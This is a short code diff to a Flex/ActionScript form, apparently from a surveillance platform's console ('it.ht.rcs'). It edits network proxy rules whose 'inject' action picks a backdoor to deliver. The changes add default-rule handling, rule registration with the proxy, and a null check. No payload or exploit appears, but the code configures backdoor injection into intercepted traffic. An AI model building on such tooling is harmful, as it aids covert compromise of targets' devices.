@@ -14,6 +14,7 @@
     <![CDATA[
       import com.adobe.serialization.json.JSON;
       
+      import it.ht.rcs.console.network.model.Proxy;
       import it.ht.rcs.console.network.model.ProxyRule;
       
       import locale.R;
@@ -23,6 +24,7 @@
       
       [Bindable]
       public var rule:ProxyRule;
+      public var proxy:it.ht.rcs.console.network.model.Proxy;
       
       public var mode:String = 'edit';
       
@@ -31,6 +33,7 @@
       
       public function init():void
       {
+        rule = rule ? rule : new ProxyRule(ProxyRule.defaultProxyRule());
         probability.value = rule.probability;
         ident.selectedItem = rule.ident;
         action.selectedItem = rule.action;
@@ -62,12 +65,14 @@
             manageReplace();
         }
         
+        proxy.rulesManager.addRule(proxy._id, rule, function(rule:ProxyRule):void {});
+        
       }
       
       private function manageInject():void
       {
         populateCommonProperties();
-        rule.action_param = backdoors.selectedItem._id;
+        rule.action_param = backdoors.selectedItem ? backdoors.selectedItem._id : null;
         
         close();
       }
